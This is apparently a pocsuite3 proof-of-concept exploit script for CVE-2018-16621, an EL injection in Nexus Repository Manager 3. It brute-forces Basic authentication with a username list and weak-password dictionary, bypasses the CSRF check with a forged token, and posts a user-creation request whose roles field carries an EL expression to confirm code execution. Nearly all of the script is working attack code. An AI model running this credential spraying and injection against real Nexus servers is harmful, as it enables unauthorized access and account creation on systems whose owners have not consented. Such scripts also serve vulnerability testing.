#!/usr/bin/env python
#coding=utf-8

import random
import json
import base64
import traceback

# 为了拿到password-top100.txt
from pocsuite3.lib.core.data import paths

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

'''
CVE-2018-16621: Nexus 3 EL injection
Admin access is required
'''
class Nexus3_2018_16621_EL_INJECTION_POC(POCBase):
    vulID = 'Nexus3-CVE-2018-16621'
    appName = 'Nexus3'
    appVersion = 'Nexus Repository Manager OSS/Pro <=3.13.0'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2018-10-18'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-03'  # 编写 PoC 的日期
    updateDate = '2020-04-07'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://support.sonatype.com/hc/en-us/articles/360010789153-CVE-2018-16621-Nexus-Repository-Manager-Java-Injection-October-17-2018']  # 漏洞地址来源,0day不用写
    name = 'Nexus3 EL injection'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危"

    
    # 使用随机字符串作为banner，计算数字之后返回
    ran1 = random.randint(1,100)

    ran2 = random.randint(100,200)
    
    ran_sum = ran1 * ran2

    h = {"NX-ANTI-CSRF-TOKEN": "test", "Cookie": "NX-ANTI-CSRF-TOKEN=test"}    # 用于通过Nexus的CSRF验证


    def _verify(self):
        result={}

        vul_url = self.url
        
        target_url = vul_url + "/service/extdirect"

        j = {
                "action":"coreui_User",
                "method":"create",
                "data": [
                    {
                        "userId": "shadowsock5",
                        "firstName": "77",
                        "lastName": "ss",
                        "password": "password",
                        "email": "77@qq.com",
                        "status": "active",
                        "roles": [
                            "$" + "{" + str(self.ran1) + "*" + str(self.ran2) + "}"
                        ]
                    }
                ],
            "type":"rpc","tid":4}
        
        resp = None    # 返回的响应
        
        
        l_auth_headers = self.get_auth_headers()
        print("user:password lenth:")
        print(len(l_auth_headers))

        for auth_header in l_auth_headers:
            # 将auth请求头更新到headers中
            self.headers.update(auth_header)
            # 更新CSRF token
            self.headers.update(self.h)
            
            try:
                # 发起payload请求
                resp = req.post(target_url, json=j, headers=self.headers) #, proxies={'http': 'http://127.0.0.1:8087'})

                if self.test_EL(resp):   # 验证响应中json的相应字段是否已经执行了EL表达式
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = target_url
                    result['VerifyInfo']['Credentials'] = auth_header
                    return self.save_output(result)
                return self.save_output(result)
            except json.decoder.JSONDecodeError as e:
                if resp.status_code == 401:
                    pass
                    #print("认证失败")
                else:
                    print("json解析失败")
                # 失败了可能只是密码错误，继续下一个密码尝试
            except Exception:
                print(e)
                raise e



    def get_auth_headers(self):
        #user = "admin"
        users = ['nexus', 'test', 'root', 'nexus3', 'admin', 'user', 'administrator']
        #passwords = ["admin", "admin123"]    # 可以在此添加多个密码
        passwords = self.get_password_dict()

        _l_auth_headers = []
        for user in users:
            for password in passwords:
                tmp = user + ':' + password
                auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
                headers = {'Authorization': 'Basic'+' '+auth}
                _l_auth_headers.append(headers)
        
        return _l_auth_headers


    def get_password_dict(self):
        f = open(paths.WEAK_PASS)
        pwddict = []
        for item in f.readlines():
            pwddict.append(item.strip())
        return pwddict


    # 验证EL表达式被执行
    def test_EL(self, p_resp):
        d = p_resp.json()
        result = d['result']['errors']['roles']
        print(result)
        print(self.ran_sum)
        try:
            if str(self.ran_sum) in result:
                return True
        except Exception:
            return False            


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(Nexus3_2018_16621_EL_INJECTION_POC)
